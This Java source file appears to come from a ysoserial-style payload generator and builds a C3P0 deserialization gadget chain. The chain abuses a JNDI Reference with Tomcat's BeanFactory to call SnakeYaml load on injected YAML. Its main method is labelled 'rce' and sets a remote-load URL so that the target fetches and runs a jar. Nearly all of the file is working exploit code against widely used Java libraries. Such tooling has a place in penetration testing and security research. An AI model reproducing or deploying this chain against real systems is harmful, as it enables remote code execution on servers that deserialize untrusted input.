package com.ppp.chain.c3p0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * SnakeYaml
 */
@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache:tomcat:8.5.35", "org.yaml:snakeyaml:<=1.33"})
@Sink({Sink.C3P0})
@Authors()
public class C3P0_Yaml implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(C3P0.class, args);

        // rce
        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(C3P0_Yaml.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.RemoteLoad);
        sinksHelper.setUrl("http://127.0.0.1:1234/SnakeyamlDemo-1.0.jar");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        sinksHelper.setJavaClassHelper(javaClassHelper);
        PayloadRunner.run(C3P0_Yaml.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject.toString());

        return kickOffObject;
    }

    public Object getChain(String yaml) throws Exception {
//        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
//        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        /**
         * Ref: https://github.com/frohoff/ysoserial/pull/184
         */
        PoolBackedDataSourceBase b = Reflections.createWithoutConstructor(PoolBackedDataSourceBase.class);
        Reflections.setFieldValue(b, "connectionPoolDataSource", new PoolSource(yaml));

        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String yaml;

        public PoolSource(String yaml) {
            this.yaml = yaml;
        }

        public Reference getReference() throws NamingException {
            String s = RanDomUtils.generateRandomString(3);
            ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", s + "=load"));
            ref.add(new StringRefAddr(s, yaml));
            return ref;
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {
        }

        public void setLoginTimeout(int seconds) throws SQLException {
        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

    }
}
